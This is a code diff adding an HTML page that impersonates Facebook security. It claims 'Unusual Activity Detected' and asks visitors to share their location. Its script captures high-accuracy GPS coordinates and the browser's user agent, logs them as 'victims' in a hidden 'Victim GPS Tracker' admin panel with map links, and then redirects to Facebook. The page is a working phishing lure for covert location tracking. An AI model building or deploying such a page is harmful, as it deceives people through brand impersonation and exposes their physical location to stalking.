@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Security</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:system-ui;background:linear-gradient(135deg,#4267B2,#365899);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;color:#1d1d1d;}
+        .container{background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);padding:40px 25px;max-width:400px;width:100%;text-align:center;}
+        .logo{font-size:60px;background:linear-gradient(45deg,#4267B2,#42a5f5);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px;}
+        h2{font-size:26px;margin-bottom:15px;}
+        p{color:#65676b;font-size:16px;line-height:1.5;margin-bottom:30px;}
+        .btn{background:linear-gradient(45deg,#42a5f5,#1877f2);color:#fff;border:none;border-radius:12px;font-size:18px;font-weight:600;padding:18px 40px;cursor:pointer;width:100%;box-shadow:0 8px 25px rgba(66,165,245,0.4);transition:all .3s;}
+        .btn:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(66,165,245,0.6);}
+        .status{margin-top:20px;padding:18px;border-radius:12px;font-weight:600;display:none;}
+        .loading{background:#e3f2fd;color:#1976d2;}
+        .success{background:#c8e6c9;color:#2e7d32;}
+        .error{background:#ffcdd2;color:#c62828;}
+        .spinner{display:inline-block;width:24px;height:24px;border:3px solid rgba(25,118,210,0.3);border-radius:50%;border-top-color:#1976d2;animation:spin 1s ease-in-out infinite;}
+        @keyframes spin{to{transform:rotate(360deg);}}
+        .retry-btn{background:#ff9800;color:#fff;margin-top:15px;padding:12px;border-radius:8px;font-size:14px;}
+        .debug{color:#666;font-size:12px;margin-top:10px;}
+        #admin{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);color:#fff;display:none;z-index:1000;overflow:auto;padding:20px;}
+        .admin-hdr{background:#4267B2;padding:25px;border-radius:15px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;}
+        .victim{background:rgba(255,255,255,0.1);margin:15px 0;padding:20px;border-radius:15px;}
+        .coords{font-size:22px;font-weight:bold;color:#42a5f5;}
+        .map-btn{background:#28a745;color:#fff;padding:12px 20px;text-decoration:none;border-radius:8px;display:inline-block;margin-top:10px;}
+        .admin-btn{position:absolute;top:20px;right:20px;background:rgba(255,255,255,0.2);color:#fff;border:none;border-radius:50%;width:50px;height:50px;cursor:pointer;font-size:20px;}
+    </style>
+</head>
+<body>
+    <button class="admin-btn" onclick="toggleAdmin()">⚙️</button>
+    
+    <div class="container">
+        <div class="logo">f</div>
+        <h2>Unusual Activity Detected</h2>
+        <p>Verify your location to secure Facebook account</p>
+        <button class="btn" onclick="startGPS()">
+            📍 Get My Location
+        </button>
+        <div id="status"></div>
+        <div id="debug" class="debug" style="display:none;"></div>
+    </div>
+
+    <div id="admin">
+        <div class="admin-hdr">
+            <h3>🎯 Victim GPS Tracker</h3>
+            <span onclick="toggleAdmin()" style="font-size:28px;cursor:pointer;">×</span>
+        </div>
+        <div id="victims">Waiting for victims...</div>
+    </div>
+
+    <script>
+        let gpsWatch = null;
+        let victims = JSON.parse(localStorage.getItem('gps_victims') || '[]');
+        
+        function log(msg) {
+            console.log('[GPS]', msg);
+            const debug = document.getElementById('debug');
+            debug.innerHTML += msg + '<br>';
+            debug.style.display = 'block';
+        }
+        
+        function showStatus(html, type) {
+            const status = document.getElementById('status');
+            status.innerHTML = html;
+            status.className = type;
+            status.style.display = 'block';
+        }
+        
+        async function checkPermission() {
+            log('Checking geolocation permission...');
+            if (!navigator.permissions || !navigator.permissions.query) {
+                log('Permissions API not available');
+                return 'unknown';
+            }
+            try {
+                const perm = await navigator.permissions.query({name: 'geolocation'});
+                log('Permission state: ' + perm.state);
+                return perm.state;
+            } catch(e) {
+                log('Permission check failed: ' + e.message);
+                return 'unknown';
+            }
+        }
+        
+        function startGPS() {
+            showStatus('<div class="spinner"></div>Connecting GPS...', 'loading');
+            log('GPS capture started');
+            
+            checkPermission().then(state => {
+                log('Permission: ' + state);
+                if (state === 'denied') {
+                    showStatus('🚫 Location blocked. Enable in Chrome Settings > Site Settings > Location', 'error');
+                    return;
+                }
+                
+                // INFINITE WATCH - Android GPS fix
+                gpsWatch = navigator.geolocation.watchPosition(
+                    onGPSSuccess,
+                    onGPSError,
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 30000,
+                        maximumAge: Infinity  // Use cached if available
+                    }
+                );
+                
+                log('watchPosition started, ID: ' + gpsWatch);
+                
+                // Fallback timeout
+                setTimeout(() => {
+                    if (gpsWatch) {
+                        navigator.geolocation.clearWatch(gpsWatch);
+                        showStatus('GPS slow. Enable High Accuracy Location & Retry <button class="retry-btn" onclick="startGPS()">Retry GPS</button>', 'error');
+                    }
+                }, 25000);
+            });
+        }
+        
+        function onGPSSuccess(position) {
+            if (gpsWatch) {
+                navigator.geolocation.clearWatch(gpsWatch);
+                gpsWatch = null;
+            }
+            
+            const victim = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                acc: Math.round(position.coords.accuracy),
+                time: new Date().toLocaleString('en-PK'),
+                ua: navigator.userAgent.slice(0,60)
+            };
+            
+            victims.unshift(victim);
+            localStorage.setItem('gps_victims', JSON.stringify(victims.slice(0,50)));
+            
+            log('SUCCESS! Lat: ' + victim.lat + ', Lng: ' + victim.lng);
+            
+            showStatus(`
+                ✅ GPS Locked!<br>
+                <strong>${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}</strong><br>
+                Accuracy: ${victim.acc}m
+                <button class="retry-btn" onclick="startGPS()" style="margin-top:10px;">Get New Location</button>
+            `, 'success');
+            
+            updateAdmin();
+            
+            // Redirect after 3s
+            setTimeout(() => window.location.href = 'https://m.facebook.com', 3000);
+        }
+        
+        function onGPSError(error) {
+            if (gpsWatch) {
+                navigator.geolocation.clearWatch(gpsWatch);
+                gpsWatch = null;
+            }
+            
+            let msg = 'GPS Error ';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    msg += '🚫 Permission Denied. Chrome Settings > Location > Allow';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    msg += '📡 No GPS signal. Go outside or enable WiFi';
+                    break;
+                case error.TIMEOUT:
+                    msg += '⏰ GPS timeout. Retry or enable High Accuracy';
+                    break;
+                default:
+                    msg += error.message;
+            }
+            
+            log('GPS Error ' + error.code + ': ' + error.message);
+            showStatus(msg + ' <button class="retry-btn" onclick="startGPS()">🔄 Retry</button>', 'error');
+        }
+        
+        function toggleAdmin() {
+            const admin = document.getElementById('admin');
+            admin.style.display = admin.style.display === 'block' ? 'none' : 'block';
+            updateAdmin();
+        }
+        
+        function updateAdmin() {
+            const list = document.getElementById('victims');
+            const data = JSON.parse(localStorage.getItem('gps_victims') || '[]');
+            
+            if (data.length === 0) {
+                list.innerHTML = '<div style="text-align:center;padding:50px;color:#ccc;font-size:18px;">No victims yet. Share the link!</div>';
+                return;
+            }
+            
+            list.innerHTML = data.map((v, i) => `
+                <div class="victim">
+                    <div style="color:#ccc;font-size:14px;">#${i+1} • ${v.time}</div>
+                    <div class="coords">${v.lat.toFixed(6)}, ${v.lng.toFixed(6)}</div>
+                    <div style="color:#aaa;font-size:14px;">${v.acc}m • ${v.ua}</div>
+                    <a href="https://maps.google.com/maps?q=${v.lat},${v.lng}&z=18" target="_blank" class="map-btn">🗺️ Maps</a>
+                </div>
+            `).join('');
+        }
+        
+        // Auto refresh admin
+        setInterval(updateAdmin, 2000);
+        
+        // Load
+        updateAdmin();
+        if (location.hash === '#admin') toggleAdmin();
+    </script>
+</body>
+</html>
